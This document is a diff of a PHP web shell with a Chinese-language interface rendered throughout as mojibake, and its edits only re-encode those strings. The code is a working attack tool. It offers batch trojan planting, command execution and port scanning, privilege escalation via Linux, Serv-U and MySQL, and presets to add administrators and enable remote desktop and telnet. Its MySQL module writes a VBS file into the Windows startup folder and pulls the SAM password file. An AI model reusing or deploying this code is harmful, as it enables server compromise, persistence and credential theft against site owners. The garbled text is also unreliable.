-<option value="4">æŸ¥çœ‹ç«¯å£</option>
-<option value="5">æŸ¥çœ‹IP</option>
-<option value="6">æ¿€æ´»guestå¸æˆ·</option>
-<option value="7">å¤åˆ¶æ–‡ä»¶</option>
-<option value="8">ftpä¸‹è½½</option>
-<option value="9">å¼€å¯telnet</option>
-<option value="10">é‡å¯</option>
+<option value="0" selected>--ÃüÁî¼¯ºÏ--</option>
+<option value="1">Ìí¼Ó¹ÜÀíÔ±</option>
+<option value="2">ÉèÎª¹ÜÀí×é</option>
+<option value="3">¿ªÆôÔ¶³Ì×ÀÃæ</option>
+<option value="4">²é¿´¶Ë¿Ú</option>
+<option value="5">²é¿´IP</option>
+<option value="6">¼¤»îguestÕÊ»§</option>
+<option value="7">¸´ÖÆÎÄ¼ş</option>
+<option value="8">ftpÏÂÔØ</option>
+<option value="9">¿ªÆôtelnet</option>
+<option value="10">ÖØÆô</option>
 </select>
 <input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:415px;">
-<input type="submit" name="runcmd" value="æ‰§è¡Œ" style="width:80px;">
+<input type="submit" name="runcmd" value="Ö´ĞĞ" style="width:80px;">
 <textarea style="width:620px;height:300px;">{$info}</textarea>
 </div></center>
 </form>
@@ -1491,7 +1494,7 @@ function Mysql_n()
 	{
 		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
 		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
-		else $MSG_BOX = 'è¿æ¥MYSQLå¤±è´¥';
+		else $MSG_BOX = 'Á¬½ÓMYSQLÊ§°Ü';
 	}
 	$downfile = 'c:/windows/repair/sam';
 	if(!empty($_POST['downfile']))
@@ -1513,27 +1516,27 @@ function Mysql_n()
 			echo $downcode;
 			exit;
 		}
-		else $MSG_BOX = 'ä¸‹è½½æ–‡ä»¶å¤±è´¥';
+		else $MSG_BOX = 'ÏÂÔØÎÄ¼şÊ§°Ü';
 	}
 	$o = isset($_GET['o']) ? $_GET['o'] : '';
 	Root_CSS();
 print<<<END
 <form method="POST" name="nform" id="nform" action="?s=n&o={$o}" enctype="multipart/form-data">
-<center><div class="actall"><a href="?s=n">[MYSQLæ‰§è¡Œè¯­å¥]</a> 
-<a href="?s=n&o=u">[MYSQLä¸Šä¼ æ–‡ä»¶]</a> 
-<a href="?s=n&o=d">[MYSQLä¸‹è½½æ–‡ä»¶]</a></div>
+<center><div class="actall"><a href="?s=n">[MYSQLÖ´ĞĞÓï¾ä]</a> 
+<a href="?s=n&o=u">[MYSQLÉÏ´«ÎÄ¼ş]</a> 
+<a href="?s=n&o=d">[MYSQLÏÂÔØÎÄ¼ş]</a></div>
 <div class="actall">
-åœ°å€ <input type="text" name="mhost" value="{$mhost}" style="width:110px">
-ç«¯å£ <input type="text" name="mport" value="{$mport}" style="width:110px">
-ç”¨æˆ· <input type="text" name="muser" value="{$muser}" style="width:110px">
-å¯†ç  <input type="text" name="mpass" value="{$mpass}" style="width:110px">
-åº“å <input type="text" name="mdata" value="{$mdata}" style="width:110px">
+µØÖ· <input type="text" name="mhost" value="{$mhost}" style="width:110px">
+¶Ë¿Ú <input type="text" name="mport" value="{$mport}" style="width:110px">
+ÓÃ»§ <input type="text" name="muser" value="{$muser}" style="width:110px">
+ÃÜÂë <input type="text" name="mpass" value="{$mpass}" style="width:110px">
+¿âÃû <input type="text" name="mdata" value="{$mdata}" style="width:110px">
 </div>
 <div class="actall" style="height:220px;">
 END;
 if($o == 'u')
 {
-	$uppath = 'C:/Documents and Settings/All Users/ã€Œå¼€å§‹ã€èœå•/ç¨‹åº/å¯åŠ¨/exp.vbs';
+	$uppath = 'C:/Documents and Settings/All Users/¡¸¿ªÊ¼¡¹²Ëµ¥/³ÌĞò/Æô¶¯/exp.vbs';
 	if(!empty($_POST['uppath']))
 	{
 		$uppath = $_POST['uppath'];
@@ -1546,24 +1549,24 @@ if($o == 'u')
 			if(@mysql_query($query,$conn))
 			{
 				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
-				$MSG_BOX = @mysql_query($query,$conn) ? 'ä¸Šä¼ æ–‡ä»¶æˆåŠŸ' : 'ä¸Šä¼ æ–‡ä»¶å¤±è´¥';
+				$MSG_BOX = @mysql_query($query,$conn) ? 'ÉÏ´«ÎÄ¼ş³É¹¦' : 'ÉÏ´«ÎÄ¼şÊ§°Ü';
 			}
-			else $MSG_BOX = 'æ’å…¥ä¸´æ—¶è¡¨å¤±è´¥';
+			else $MSG_BOX = '²åÈëÁÙÊ±±íÊ§°Ü';
 			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
 		}
-		else $MSG_BOX = 'åˆ›å»ºä¸´æ—¶è¡¨å¤±è´¥';
+		else $MSG_BOX = '´´½¨ÁÙÊ±±íÊ§°Ü';
 	}
 print<<<END
-<br><br>ä¸Šä¼ è·¯å¾„ <input type="text" name="uppath" value="{$uppath}" style="width:500px">
-<br><br>é€‰æ‹©æ–‡ä»¶ <input type="file" name="upfile" style="width:500px;height:22px;">
-</div><div class="actall"><input type="submit" value="ä¸Šä¼ " style="width:80px;">
+<br><br>ÉÏ´«Â·¾¶ <input type="text" name="uppath" value="{$uppath}" style="width:500px">
+<br><br>Ñ¡ÔñÎÄ¼ş <input type="file" name="upfile" style="width:500px;height:22px;">
+</div><div class="actall"><input type="submit" value="ÉÏ´«" style="width:80px;">
 END;
 }
 elseif($o == 'd')
 {
 print<<<END
-<br><br><br>ä¸‹è½½æ–‡ä»¶ <input type="text" name="downfile" value="{$downfile}" style="width:500px">
-</div><div class="actall"><input type="submit" value="ä¸‹è½½" style="width:80px;">
+<br><br><br>ÏÂÔØÎÄ¼ş <input type="text" name="downfile" value="{$downfile}" style="width:500px">
+</div><div class="actall"><input type="submit" value="ÏÂÔØ" style="width:80px;">
 END;
 }
 else
@@ -1573,7 +1576,7 @@ else
 		$msql = $_POST['msql'];
 		if($result = @mysql_query($msql,$conn))
 		{
-			$MSG_BOX = 'æ‰§è¡ŒSQLè¯­å¥æˆåŠŸ<br>';
+			$MSG_BOX = 'Ö´ĞĞSQLÓï¾ä³É¹¦<br>';
 			$k = 0;
 			while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
 		}
@@ -1594,19 +1597,19 @@ function nFull(i){
 <textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
 <div class="actall">
 <select onchange="return nFull(options[selectedIndex].value)">
-	<option value="0" selected>æ˜¾ç¤ºç‰ˆæœ¬</option>
-	<option value="1">å¯¼å‡ºæ–‡ä»¶</option>
-	<option value="2">å†™å…¥æ–‡ä»¶</option>
-	<option value="3">å¼€å¯å¤–è¿</option>
+	<option value="0" selected>ÏÔÊ¾°æ±¾</option>
+	<option value="1">µ¼³öÎÄ¼ş</option>
+	<option value="2">Ğ´ÈëÎÄ¼ş</option>
+	<option value="3">¿ªÆôÍâÁ¬</option>
 </select>
-<input type="submit" value="æ‰§è¡Œ" style="width:80px;">
+<input type="submit" value="Ö´ĞĞ" style="width:80px;">
 END;
 }
 	echo '<br>'.$MSG_BOX.'</div></center></form>';
 	return true;
 }
 
-//MYSQLç®¡ç†
+//MYSQL¹ÜÀí
 
 function Mysql_Len($data,$len)
 {
@@ -1623,7 +1626,7 @@ print<<<END
 <script language="javascript">
 function Delok(msg,gourl)
 {
-	smsg = "ç¡®å®šè¦åˆ é™¤[" + unescape(msg) + "]å—?";
+	smsg = "È·¶¨ÒªÉ¾³ı[" + unescape(msg) + "]Âğ?";
 	if(confirm(smsg)){window.location = gourl;}
 }
 function Createok(ac)
@@ -1636,18 +1639,18 @@ function Createok(ac)
 </script>
 END;
 		$BOOL = false;
-		$MSG_BOX = 'ç”¨æˆ·:'.$_COOKIE['m_spideruser'].' &nbsp;&nbsp;&nbsp;&nbsp; åœ°å€:'.$_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'].' &nbsp;&nbsp;&nbsp;&nbsp; ç‰ˆæœ¬:';
+		$MSG_BOX = 'ÓÃ»§:'.$_COOKIE['m_spideruser'].' &nbsp;&nbsp;&nbsp;&nbsp; µØÖ·:'.$_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'].' &nbsp;&nbsp;&nbsp;&nbsp; °æ±¾:';
 		$k = 0;
 		$result = @mysql_query('select version();',$conn);
 		while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
-		echo '<div class="actall"> æ•°æ®åº“:';
+		echo '<div class="actall"> Êı¾İ¿â:';
 		$result = mysql_query("SHOW DATABASES",$conn);
 		while($db = mysql_fetch_array($result)){echo '&nbsp;&nbsp;[<a href="?s=r&db='.$db['Database'].'">'.$db['Database'].'</a>]';}
 		echo '</div>';
 		if(isset($_GET['db']))
 		{
 			mysql_select_db($_GET['db'],$conn);
-			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? 'æ‰§è¡ŒæˆåŠŸ' : 'æ‰§è¡Œå¤±è´¥ '.mysql_error();}
+			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? 'Ö´ĞĞ³É¹¦' : 'Ö´ĞĞÊ§°Ü '.mysql_error();}
 			if(is_array($_POST['insql']))
 			{
 				$query = 'INSERT INTO '.$_GET['table'].' (';
@@ -1657,7 +1660,7 @@ END;
 					$queryb .= '\''.addslashes($key).'\',';
 				}
 				$query = $query.substr($querya, 0, -1).') VALUES ('.substr($queryb, 0, -1).');';
-				$MSG_BOX = mysql_query($query,$conn) ? 'æ·»åŠ æˆåŠŸ' : 'æ·»åŠ å¤±è´¥ '.mysql_error();
+				$MSG_BOX = mysql_query($query,$conn) ? 'Ìí¼Ó³É¹¦' : 'Ìí¼ÓÊ§°Ü '.mysql_error();
 			}
 			if(is_array($_POST['upsql']))
 			{
@@ -1667,7 +1670,7 @@ END;
 					$queryb .= $var.'=\''.addslashes($key).'\',';
 				}
 				$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';
-				$MSG_BOX = mysql_query($query,$conn) ? 'ä¿®æ”¹æˆåŠŸ' : 'ä¿®æ”¹å¤±è´¥ '.mysql_error();
+				$MSG_BOX = mysql_query($query,$conn) ? 'ĞŞ¸Ä³É¹¦' : 'ĞŞ¸ÄÊ§°Ü '.mysql_error();
 			}
 			if(isset($_GET['del']))
 			{
@@ -1676,23 +1679,23 @@ END;
 				$query = 'DELETE FROM '.$_GET['table'].' WHERE ';
 				foreach($good as $var => $key){$queryc .= $var.'=\''.addslashes($key).'\' AND ';}
 				$where = $query.substr($queryc, 0, -4).';';
-				$MSG_BOX = mysql_query($where,$conn) ? 'åˆ é™¤æˆåŠŸ' : 'åˆ é™¤å¤±è´¥ '.mysql_error();
+				$MSG_BOX = mysql_query($where,$conn) ? 'É¾³ı³É¹¦' : 'É¾³ıÊ§°Ü '.mysql_error();
 			}
 			$action = '?s=r&db='.$_GET['db'];
-			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? 'åˆ é™¤æˆåŠŸ' : 'åˆ é™¤å¤±è´¥ '.mysql_error();}
+			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? 'É¾³ı³É¹¦' : 'É¾³ıÊ§°Ü '.mysql_error();}
 			if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}
 			if(isset($_GET['insert'])) $action .= '&insert='.$_GET['insert'];
 			echo '<div class="actall"><form method="POST" action="'.$action.'">';
 			echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">'.$_POST['nsql'].'</textarea> ';
-			echo '<input type="submit" name="querysql" value="æ‰§è¡Œ" style="width:60px;height:49px;"> ';
-			echo '<input type="button" value="åˆ›å»ºè¡¨" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
-			echo '<input type="button" value="åˆ›å»ºåº“" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
-			echo '<input type="button" value="åˆ é™¤åº“" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
+			echo '<input type="submit" name="querysql" value="Ö´ĞĞ" style="width:60px;height:49px;"> ';
+			echo '<input type="button" value="´´½¨±í" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
+			echo '<input type="button" value="´´½¨¿â" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
+			echo '<input type="button" value="É¾³ı¿â" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
 			echo '<div class="msgbox" style="height:40px;">'.$MSG_BOX.'</div><div class="actall"><a href="?s=r&db='.$_GET['db'].'">'.$_GET['db'].'</a> ---> ';
 			if(isset($_GET['table']))
 			{
 				echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'">'.$_GET['table'].'</a> ';
-				echo '[<a href="?s=r&db='.$_GET['db'].'&insert='.$_GET['table'].'">æ’å…¥</a>]</div>';
+				echo '[<a href="?s=r&db='.$_GET['db'].'&insert='.$_GET['table'].'">²åÈë</a>]</div>';
 				if(isset($_GET['edit']))
 				{
 					if(isset($_GET['p'])) $atable = $_GET['table'].'&p='.$_GET['p']; else $atable = $_GET['table'];
@@ -1720,7 +1723,7 @@ END;
 		      $row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));
 		      if(!isset($_GET['p'])){$p = 0;$_GET['p'] = 1;} else $p = ((int)$_GET['p']-1)*20;
 					echo '<table border="0"><tr>';
-					echo '<td class="toptd" style="width:70px;" nowrap>æ“ä½œ</td>';
+					echo '<td class="toptd" style="width:70px;" nowrap>²Ù×÷</td>';
 					while($row = @mysql_fetch_assoc($result))
 					{
 						array_push($fields,$row['Field']);
@@ -1732,8 +1735,8 @@ END;
 					$v = $p;
 					while($text = @mysql_fetch_assoc($result))
 					{
-						echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'">ä¿®æ”¹</a> ';
-						echo '<a href="#" onclick="Delok(\'å®ƒ\',\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;">åˆ é™¤</a></td>';
+						echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'">ĞŞ¸Ä</a> ';
+						echo '<a href="#" onclick="Delok(\'Ëü\',\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;">É¾³ı</a></td>';
 						foreach($fields as $row){echo '<td>'.nl2br(htmlspecialchars(Mysql_Len($text[$row],500))).'</td>';}
 						echo '</tr>'."\r\n";$v++;
 					}
@@ -1768,16 +1771,16 @@ END;
 				}
 				$query = 'SHOW TABLES FROM '.$_GET['db'].';';
 				echo '</div><table border="0"><tr>';
-				echo '<td class="toptd" style="width:550px;"> è¡¨å </td>';
-				echo '<td class="toptd" style="width:80px;"> æ“ä½œ </td>';
-				echo '<td class="toptd" style="width:130px;"> å­—ç¬¦é›† </td>';
-				echo '<td class="toptd" style="width:70px;"> å¤§å° </td></tr>';
+				echo '<td class="toptd" style="width:550px;"> ±íÃû </td>';
+				echo '<td class="toptd" style="width:80px;"> ²Ù×÷ </td>';
+				echo '<td class="toptd" style="width:130px;"> ×Ö·û¼¯ </td>';
+				echo '<td class="toptd" style="width:70px;"> ´óĞ¡ </td></tr>';
 				$result = @mysql_query($query,$conn);
 				$k = 0;
 				while($table = mysql_fetch_row($result))
 				{
 					echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$table[0].'">'.$table[0].'</a></td>';
-					echo '<td><a href="?s=r&db='.$_GET['db'].'&insert='.$table[0].'">æ’å…¥</a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\');return false;">åˆ é™¤</a></td>';
+					echo '<td><a href="?s=r&db='.$_GET['db'].'&insert='.$table[0].'">²åÈë</a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\');return false;">É¾³ı</a></td>';
 					echo '<td>'.$statucoll[$k].'</td><td align="right">'.File_Size($statusize[$k]).'</td></tr>'."\r\n";
 					$k++;
 				}
@@ -1785,7 +1788,7 @@ END;
 			}
 		}
 	}
-	else die('è¿æ¥MYSQLå¤±è´¥,è¯·é‡æ–°ç™»é™†.<meta http-equiv="refresh" content="0;URL=?s=o">');
+	else die('Á¬½ÓMYSQLÊ§°Ü,ÇëÖØĞÂµÇÂ½.<meta http-equiv="refresh" content="0;URL=?s=o">');
 	if(!$BOOL) echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \''.addslashes($query).'\';</script>';
 	return false;
 }
@@ -1802,16 +1805,16 @@ function Mysql_o()
 	  	setcookie('m_spiderport',$_POST['mport'],$cookietime);
 	  	setcookie('m_spideruser',$_POST['muser'],$cookietime);
 	  	setcookie('m_spiderpass',$_POST['mpass'],$cookietime);
-	  	die('æ­£åœ¨ç™»é™†,è¯·ç¨å€™...<meta http-equiv="refresh" content="0;URL=?s=r">');
+	  	die('ÕıÔÚµÇÂ½,ÇëÉÔºò...<meta http-equiv="refresh" content="0;URL=?s=r">');
 	  }
   }
 print<<<END
 <form method="POST" name="oform" id="oform" action="?s=o">
-<div class="actall">åœ°å€ <input type="text" name="mhost" value="localhost" style="width:300px"></div>
-<div class="actall">ç«¯å£ <input type="text" name="mport" value="3306" style="width:300px"></div>
-<div class="actall">ç”¨æˆ· <input type="text" name="muser" value="root" style="width:300px"></div>
-<div class="actall">å¯†ç  <input type="text" name="mpass" value="" style="width:300px"></div>
-<div class="actall"><input type="submit" value="ç™»é™†" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?s=r';"></div>
+<div class="actall">µØÖ· <input type="text" name="mhost" value="localhost" style="width:300px"></div>
+<div class="actall">¶Ë¿Ú <input type="text" name="mport" value="3306" style="width:300px"></div>
+<div class="actall">ÓÃ»§ <input type="text" name="muser" value="root" style="width:300px"></div>
+<div class="actall">ÃÜÂë <input type="text" name="mpass" value="" style="width:300px"></div>
+<div class="actall"><input type="submit" value="µÇÂ½" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?s=r';"></div>
 </form>
 END;
 	ob_end_flush();
@@ -1850,7 +1853,7 @@ print<<<END
 	<head>
 		<style type="text/css">
 			*{padding:0; margin:0;}
-			body{background:#AAAAAA;font-family:"Verdana", "Tahoma", "å®‹ä½“",sans-serif; font-size:13px;margin:0 auto; text-align:center;margin-top:5px;word-break:break-all;}
+			body{background:#AAAAAA;font-family:"Verdana", "Tahoma", "ËÎÌå",sans-serif; font-size:13px;margin:0 auto; text-align:center;margin-top:5px;word-break:break-all;}
 			a{color:#FFFFFF;text-decoration:none;}
 			a:hover{background:#BBBBBB;}
 			.outtable {height:595px;width:955px;color:#000000;border-top-width: 2px;border-right-width: 2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
@@ -1883,22 +1886,22 @@ print<<<END
 				<tr>
 				<td width="140" align="center" valign="top">
 					<ul class="listbg">
-						<li><a href="?s=a" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main"> æ–‡ä»¶ç®¡ç† </a></li>
-						<li><a href="?s=b" id="t_1" onclick="switchTab('t_1')" target="main"> æ‰¹é‡æŒ‚é©¬ </a></li>
-						<li><a href="?s=c" id="t_2" onclick="switchTab('t_2')" target="main"> æ‰¹é‡æ¸…é©¬ </a></li>
-						<li><a href="?s=d" id="t_3" onclick="switchTab('t_3')" target="main"> æ‰¹é‡æ›¿æ¢ </a></li>
-						<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main"> æŸ¥æ‰¾æœ¨é©¬ </a></li>
-						<li><a href="?s=f" id="t_5" onclick="switchTab('t_5')" target="main"> ç³»ç»Ÿä¿¡æ¯ </a></li>
-						<li><a href="?s=g" id="t_6" onclick="switchTab('t_6')" target="main"> æ‰§è¡Œå‘½ä»¤ </a></li>
-						<li><a href="?s=h" id="t_7" onclick="switchTab('t_7')" target="main"> ç»„ä»¶æ¥å£ </a></li>
-						<li><a href="?s=i" id="t_8" onclick="switchTab('t_8')" target="main"> ç«¯å£æ‰«æ </a></li>
-						<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main"> ç½‘é©¬è½¬æ¢ </a></li>
-						<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main"> Linuxææƒ </a></li>
-						<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main"> ServUææƒ </a></li>
-						<li><a href="?s=m" id="t_12" onclick="switchTab('t_12')" target="main"> MYSQLææƒ </a></li>
-						<li><a href="?s=n" id="t_13" onclick="switchTab('t_13')" target="main"> MYSQLæ‰§è¡Œ </a></li>
-						<li><a href="?s=o" id="t_14" onclick="switchTab('t_14')" target="main"> MYSQLç®¡ç† </a></li>
-						<li><a href="?s=logout" id="t_15" onclick="switchTab('t_15')"> é€€å‡ºç³»ç»Ÿ </a></li>
+						<li><a href="?s=a" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main"> ÎÄ¼ş¹ÜÀí </a></li>
+						<li><a href="?s=b" id="t_1" onclick="switchTab('t_1')" target="main"> ÅúÁ¿¹ÒÂí </a></li>
+						<li><a href="?s=c" id="t_2" onclick="switchTab('t_2')" target="main"> ÅúÁ¿ÇåÂí </a></li>
+						<li><a href="?s=d" id="t_3" onclick="switchTab('t_3')" target="main"> ÅúÁ¿Ìæ»» </a></li>
+						<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main"> ²éÕÒÄ¾Âí </a></li>
+						<li><a href="?s=f" id="t_5" onclick="switchTab('t_5')" target="main"> ÏµÍ³ĞÅÏ¢ </a></li>
+						<li><a href="?s=g" id="t_6" onclick="switchTab('t_6')" target="main"> Ö´ĞĞÃüÁî </a></li>
+						<li><a href="?s=h" id="t_7" onclick="switchTab('t_7')" target="main"> ×é¼ş½Ó¿Ú </a></li>
+						<li><a href="?s=i" id="t_8" onclick="switchTab('t_8')" target="main"> ¶Ë¿ÚÉ¨Ãè </a></li>
+						<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main"> ÍøÂí×ª»» </a></li>
+						<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main"> LinuxÌáÈ¨ </a></li>
+						<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main"> ServUÌáÈ¨ </a></li>
+						<li><a href="?s=m" id="t_12" onclick="switchTab('t_12')" target="main"> MYSQLÌáÈ¨ </a></li>
+						<li><a href="?s=n" id="t_13" onclick="switchTab('t_13')" target="main"> MYSQLÖ´ĞĞ </a></li>
+						<li><a href="?s=o" id="t_14" onclick="switchTab('t_14')" target="main"> MYSQL¹ÜÀí </a></li>
+						<li><a href="?s=logout" id="t_15" onclick="switchTab('t_15')"> ÍË³öÏµÍ³ </a></li>
 					</ul>
 				</td>
 				<td>
@@ -1967,5 +1970,4 @@ switch($s)
 	default: WinMain(); break;
 }
 ?>
-
 
